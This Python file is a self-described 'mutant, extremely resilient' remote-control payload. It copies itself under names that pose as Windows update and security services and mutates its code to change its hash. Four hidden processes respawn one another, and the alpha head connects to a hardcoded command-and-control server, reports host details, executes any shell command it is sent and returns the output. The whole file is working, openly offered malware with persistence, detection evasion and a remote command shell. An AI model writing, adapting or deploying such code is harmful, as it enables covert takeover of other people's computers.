"""
PAVION PAYLOAD — v2.0 (CIEL EDITION)
Distantly controlled, mutant, and extremely resilient payload.
Mechanism: 4 heads that monitor and respawn each other unless all are killed simultaneously.
"""

import sys
import os
import json
import uuid
import time
import socket
import platform
import subprocess
import threading
import random
import string
import shutil
from argparse import ArgumentParser

# ==========================================
# CONFIGURATION
# ==========================================
HIVE_IP = "192.168.1.118"
HIVE_PORT = 8089
URI = f"ws://{HIVE_IP}:{HIVE_PORT}"

# Watchdog Ports for the 4 heads
PORTS = [55001, 55002, 55003, 55004]

# Locations for dispersion (Windows-centric, fallbacks for others)
if platform.system() == "Windows":
    LOCATIONS = [
        os.path.join(os.environ.get('TEMP', '.'), 'WinUpdateSvc.py'),
        os.path.join(os.environ.get('APPDATA', '.'), 'SystemHost.py'),
        os.path.join(os.environ.get('LOCALAPPDATA', '.'), 'SecurityHealth.py'),
        os.path.join(os.path.expanduser('~'), 'Documents', 'OfficeUpdater.py')
    ]
else:
    # Linux/Mac fallbacks
    LOCATIONS = [
        f"/tmp/.head_{i}.py" for i in range(4)
    ]

# ==========================================
# GENOME & MUTATION
# ==========================================

class HydraGenome:
    """Handles the mutation and replication of the payload's code."""
    
    @staticmethod
    def mutate(source_code):
        """Adds random 'junk' code and modifies signatures to change file hash."""
        # Add a random unique mutation signature
        mutation_id = "".join(random.choices(string.ascii_letters + string.digits, k=16))
        junk_comment = f"\n# [MUTATION_SIG] {mutation_id}\n"
        
        # Insert a dummy function with a random name
        dummy_name = "void_" + "".join(random.choices(string.ascii_lowercase, k=8))
        dummy_func = f"\ndef {dummy_name}():\n    return '{mutation_id}'\n"
        
        return source_code + junk_comment + dummy_func

    @staticmethod
    def replicate(target_path):
        """Copies the current script to a target path with mutation."""
        try:
            with open(__file__, "r", encoding="utf-8") as f:
                code = f.read()
            
            mutated_code = HydraGenome.mutate(code)
            
            with open(target_path, "w", encoding="utf-8") as f:
                f.write(mutated_code)
            
            return True
        except Exception as e:
            print(f"[PAVION] Replication failed to {target_path}: {e}")
            return False

# ==========================================
# RESILIENCE WATCHDOG
# ==========================================

class ResilienceWatchdog:
    """Monitors other heads and respawns them if they go dark."""
    
    def __init__(self, head_id):
        self.head_id = head_id
        self.my_port = PORTS[head_id]
        self.is_running = True
        
    def start_listener(self):
        """Listen on a local port so other heads know I am alive."""
        def listen():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.bind(('127.0.0.1', self.my_port))
                s.listen(5)
                while self.is_running:
                    conn, _ = s.accept()
                    conn.close()
            except Exception:
                # If port is busy, another instance might be running or port is blocked
                pass
        
        threading.Thread(target=listen, daemon=True).start()

    def check_and_respawn(self):
        """Continuously poll other heads and respawn dead ones."""
        while self.is_running:
            time.sleep(3)
            for i in range(4):
                if i == self.head_id:
                    continue
                
                # Try to connect to the head's port
                try:
                    s = socket.create_connection(('127.0.0.1', PORTS[i]), timeout=1)
                    s.close()
                except (ConnectionRefusedError, socket.timeout, OSError):
                    # HEAD IS DEAD!
                    print(f"[PAVION] Head {i} is DOWN. Commencing resurrection...")
                    self.resurrect(i)

    def resurrect(self, target_id):
        """Replicates and launches a dead head."""
        target_path = LOCATIONS[target_id]
        if HydraGenome.replicate(target_path):
            # Launch the head
            try:
                subprocess.Popen([sys.executable, target_path, "--head-id", str(target_id)], 
                                 creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0)
                print(f"[PAVION] Head {target_id} resurrected successfully at {target_path}")
            except Exception as e:
                print(f"[PAVION] Failed to launch resurrected head {target_id}: {e}")

# ==========================================
# CORE PAYLOAD LOGIC (ALPHA HEAD ONLY)
# ==========================================

try:
    import websocket
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "websocket-client"])
    import websocket

def on_message(ws, message):
    try:
        data = json.loads(message)
        if data.get("type") == "handshake_ok":
            print(f"[PAVION] Connected to Hive Mind.")
        elif data.get("type") == "exec" and data.get("command"):
            cmd = data.get("command")
            if cmd == "PAVION_KILL_ALL": # Emergency Kill Switch
                print("[PAVION] RECEIVED EXTERMINATION ORDER. SHUTTING DOWN ALL HEADS.")
                os._exit(0)
                
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=45)
            ws.send(json.dumps({
                "type": "response",
                "requestId": data.get("requestId"),
                "output": output.decode('utf-8', errors='ignore')
            }))
    except Exception as e:
        print(f"[PAVION] Error: {e}")

def run_payload():
    """Main communication loop for Alpha head."""
    while True:
        try:
            ws = websocket.WebSocketApp(URI,
                on_open=lambda ws: ws.send(json.dumps({
                    "type": "handshake", "id": f"hydra_{platform.node()}",
                    "hostname": platform.node(), "os": platform.system()
                })),
                on_message=on_message,
                on_error=lambda ws, err: print(f"Err: {err}"),
                on_close=lambda ws, c, m: time.sleep(5))
            ws.run_forever()
        except Exception:
            time.sleep(10)

# ==========================================
# MAIN ENTRY POINT
# ==========================================

if __name__ == "__main__":
    parser = ArgumentParser()
    parser.add_argument("--head-id", type=int, default=0, help="Head index (0-3)")
    args = parser.parse_args()

    head_id = args.head_id
    print(f"--- PAVION HEAD {head_id} ACTIVE ---")

    # 1. Start the Watchdog
    watchdog = ResilienceWatchdog(head_id)
    watchdog.start_listener()
    
    # Start checking other heads in a separate thread
    threading.Thread(target=watchdog.check_and_respawn, daemon=True).start()

    # 2. Strategic Dispersion (Initial Spawn)
    # If we are Head 0 (Alpha), we make sure others are spawned initially
    if head_id == 0:
        for i in range(1, 4):
            # Only spawn if port is not reachable
            try:
                s = socket.create_connection(('127.0.0.1', PORTS[i]), timeout=0.5)
                s.close()
            except:
                watchdog.resurrect(i)

    # 3. Main Role
    if head_id == 0:
        # Alpha head manages the C2 connection
        run_payload()
    else:
        # Silent watchdog heads just keep the script alive
        while True:
            time.sleep(60)
